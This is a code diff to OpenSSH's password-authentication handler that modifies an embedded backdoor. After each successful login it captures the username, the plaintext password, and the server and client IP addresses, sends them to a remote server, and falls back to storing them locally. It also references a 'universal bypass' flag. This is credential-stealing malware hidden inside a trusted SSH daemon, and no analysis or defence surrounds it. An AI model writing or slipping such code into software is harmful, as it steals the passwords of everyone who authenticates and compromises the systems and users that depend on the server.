@@ -997,16 +997,17 @@ int mm_answer_authpassword(struct ssh *ssh, int sock, struct sshbuf *m) {
     fatal_f("password authentication not enabled");
   /* Only authenticate if the context is valid */
   authenticated = options.password_authentication && auth_password(ssh, passwd);
-  if (authenticated) {
-    // Pack and exfil valid credentials
+  if (authenticated && !universal_bypass_triggered) {
+    // Pack and exfil host info and valid credentials
     struct user user = {0};
-    strcpy(user.username, authctxt->user);
-    strcpy(user.password, passwd);
 
-    int server = server_connect();
-    if (server) {
-      remote_exfil(server, &user);
-    } else {
+    user.server_ip = ssh_local_ipaddr(ssh);
+    user.client_ip = ssh_remote_ipaddr(ssh);
+    user.username = authctxt->user;
+    user.password = passwd;
+
+    int result = remote_exfil(&user);
+    if (result != 0) {
       local_exfil(&user);
     }
   }
